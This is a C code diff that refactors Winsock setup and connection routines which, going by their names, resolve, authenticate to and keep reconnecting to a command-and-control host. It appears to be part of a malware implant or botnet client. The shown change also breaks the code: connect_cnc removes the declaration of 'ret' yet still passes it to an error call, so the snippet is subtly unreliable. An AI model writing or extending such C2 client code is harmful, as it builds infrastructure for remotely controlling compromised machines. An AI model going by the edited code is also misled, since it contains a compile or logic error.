@@ -16,22 +16,19 @@ void init_winsock()
     WSADATA wsaData = {};
     int ret = 0;
 
-    ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (ret != 0)
+    if ((ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
         fatal_error("WSAStartup failed: %d", ret);
     log_debug("Initialized Winsock.");
 }
 
 void get_cnc_addrinfo(struct addrinfo **result)
 {
-    int ret = 0;
     char cnc_addr[255];
     long unsigned int cnc_addr_len = sizeof(cnc_addr);
     struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
 
-    ret = getaddrinfo(cnc_host, CNC_PORT, &hints, result);
-    if (ret != 0)
-        fatal_error("getaddrinfo failed: %d", ret);
+    if (getaddrinfo(cnc_host, CNC_PORT, &hints, result) != 0)
+        fatal_error("getaddrinfo failed: %d", WSAGetLastError());
 
     cnc_addrinfo = *result;
     WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
@@ -63,15 +60,11 @@ void auth_cnc()
 
 void connect_cnc(struct addrinfo *cnc_addrinfo)
 {
-    int ret = 0;
-
     while (TRUE)
     {
-        ret = connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen);
-        if (ret == SOCKET_ERROR)
+        if (connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen) == SOCKET_ERROR)
         {
-            ret = WSAGetLastError();
-            if (ret != WSAECONNREFUSED)
+            if (WSAGetLastError() != WSAECONNREFUSED)
                 fatal_error("Error at connect(): %ld", ret);
             else
             {
